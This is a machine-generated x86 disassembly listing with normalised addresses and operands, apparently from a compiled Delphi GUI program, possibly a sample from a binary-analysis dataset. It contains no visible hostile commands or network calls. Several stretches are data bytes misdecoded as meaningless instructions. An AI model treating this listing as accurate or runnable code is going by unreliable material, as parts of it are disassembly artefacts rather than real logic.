mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x81 ] 0x1
inc edi
xor esi esi
mov eax [ rw-data ]
push eax
push 0x4
mov ecx 0x4
mov edx 0xffff
mov eax ebx
call sub_46ff18
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_470524
mov ebx eax
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_46fdf8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x1
je r-xdata
jmp r-xdata
mov eax ebx
call sub_46ff84
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x90 ]
mov eax ebx
call sub_4700c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_470524
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477168
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx ebx
call sub_4188ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
inc esi
dec edi
jne r-xdata
jmp r-xdata
sub_476edc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov [ ebx + 0x6c ] esi
test esi esi
je r-xdata
lea eax [ ebx + 0x6c ]
call sub_40d130
mov [ ebx + 0x80 ] 0x0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_42109c
sub_476f10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov [ ebx + 0x88 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_42109c
mov [ ebx + 0x81 ] 0x0
lea eax [ ebx + 0x88 ]
call sub_40d130
sub_476f50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_418974
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_476fdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_4189d8
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4185b0
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x68 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_420f28
mov eax ebx
call sub_403154
inc edi
dec esi
jne r-xdata
sub_476ff8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477108
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47710f
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
call sub_418974
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_477080
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477087
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
call sub_4189d8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4185b0
mov edi eax
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x5c ]
inc esi
dec ebx
jne r-xdata
sub_477087
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa4 ]
cdq
idiv [ rw-data ]
mov ebx eax
test ebx ebx
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46ecfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_475564
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47710f
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
dec ebx
jne r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_477118
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x6c ]
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_475784
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x80 ] 0x1
sub_477168
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_474c24
mov eax [ ebp + 0x8 ]
mov [ edi + 0x68 ] eax
mov [ edi + 0x6c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4771b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403748#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477328
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x88 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_477118
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x68 ] eax
mov edx ebx
call sub_473a70
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov esi [ ebx + 0x98 ]
test esi esi
jle r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d130
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0xac ]
mov edx [ ebp - 0xc ]
call sub_4188ec
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx esi
mov eax [ ebx + 0xac ]
call sub_475564
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_477118
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_418988
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x94 ]
mov eax [ ebp - 0x8 ]
call sub_47446c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x58 ]
lea eax [ ebp - 0xc ]
call sub_40d130
jmp r-xdata
sub_477304
call sub_40d130
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_476b64
call sub_403984
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477328
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_473180
mov [ edi + 0xb8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47736c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4773b5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_473a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4773ba
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf ] 0x1
call sub_403930
call sub_403984
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_473a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_477434
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_474e6c
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ eax + 0xb8 ]
test edx edx
je r-xdata
lea eax [ ebx + 0x68 ]
call sub_40d130
mov esi edx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
mov eax esi
call sub_477118
test eax eax
je r-xdata
mov edx ebx
call sub_418988
mov eax esi
call sub_477118
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_477488
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4775fa
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403748#5
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_403748#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477601
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_47750e
add eax [ eax ]
add [ eax ] al
dec eax
mov bh 0x46
add [ edx ] ch
jne r-xdata
push edx
push 0xb8928b
add [ eax ] al
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_4769d0
jmp r-xdata
add [ ebp + ebp * 4 + 0x755c0046 ] dh
inc edi
add [ eax - 0x53 ] dl
inc esi
add [ ebp + 0x75 ] dh
inc edi
add [ ecx - 0x3ba743d ] cl
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_4769d0
mov eax [ ebx + 0xc ]
add eax 0xffffd8bb
sub eax 0x2
jae r-xdata
call sub_403984
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477601
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_47755c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_4769d0
jmp r-xdata
call sub_403984
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477601
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_477575
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_4769d0
call sub_403984
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477601
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_4775b7
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
jo r-xdata
add bl al
jne r-xdata
mov ebx eax
mov eax ebx
call sub_419180
pop ebx
retn
add [ ebx + 0x528bfc55 ] cl
push 0xb8928b
add [ eax ] al
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_4769d0
call sub_403930
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477601
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_477614
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ r-xdata ]
push eax
mov ecx esi
xor edx edx
mov eax edi
call sub_419638
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_477678
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477995
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_403f50
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_407f14
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47799c
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_403f74
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ba4
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_47796b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
add eax 0x10
mov edx ebx
call sub_403fa4
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x14 ]
add eax 0x20
mov edx [ ebp - 0x10 ]
call sub_403fa4
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404210
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_404470
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
call sub_407f14
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404210
mov edx eax
inc edx
mov ecx 0x7fffffff
mov eax ebx
call sub_404470
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404210
mov ecx eax
inc ecx
mov edx 0x1
mov eax ebx
call sub_404470
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0xc ]
call sub_404138
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x1c ]
call sub_40425c
mov edx [ ebp - 0x1c ]
pop eax
call sub_407f14
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404210
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
mov eax ebx
call sub_404470
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor ecx ecx
push ebp
push sub_477868
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0x28 ]
cmp bl 0x20
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_404138
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4753ec
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475308
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_477c60
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_4744c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403154
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_4744c8
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_47786d
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
jo r-xdata
add [ eax ] al
add [ ecx + 0x78 ] bh
inc edi
add [ ebx + 0x7a80ec55 ] cl
or al 0x0
je r-xdata
call sub_403930
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_4710e8
mov eax [ ebp - 0x14 ]
call sub_477c60
jmp r-xdata
call sub_403930
call sub_403984
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x2c ]
test edx edx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403154
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
call sub_403984
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_477c60
test edx edx
jle r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov edx [ edx + 0xf0 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_4710e8
mov eax [ ebp - 0x14 ]
call sub_477c60
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_4744c8
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_4744c8
sub_4779ab
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_477a6f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_418f04
mov [ esi + 0xc ] 0x20
mov [ esi + 0x19 ] 0x1
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x8 ]
call sub_408080
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x108 ]
mov eax [ esi ]
call sub_4030a4
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4041b4
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x1c ]
pop ecx
call sub_40425c
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x29 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x34 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477a76
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
add esp 0xfffffff0
call sub_4034a0
sub_477a94
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x34 ]
call sub_40d130
lea eax [ esi + 0x30 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f3c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_477ae0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_477b5d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_418fd0
mov eax [ ebx + 0x4 ]
call sub_47766c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403350
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4042d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b64
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_477b6f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_403fa4
mov edx esi
mov eax ebx
call sub_4190b0
pop esi
pop ebx
retn
sub_477ba4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x18 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_477c08
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d130
lea eax [ esi + 0x18 ]
call sub_40d130
lea eax [ esi + 0x8 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_477c60
push ebx
mov ebx eax
mov [ ebx + 0xc ] 0x0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x9c ]
mov edx [ ebx + 0x14 ]
call sub_4711d0
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx [ ebx + 0x14 ]
call sub_47446c
pop ebx
retn
sub_477c90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477cb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477cbc
retn
sub_477d83
inc [ edx ]
add [ eax ] al
add [ edx ] bl
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_477dd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477dd8
retn
mov eax rw-data
call sub_403f50
mov eax rw-data
call sub_403f50
mov eax rw-data
call sub_403f50
sub_477f14
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
xor ebx ebx
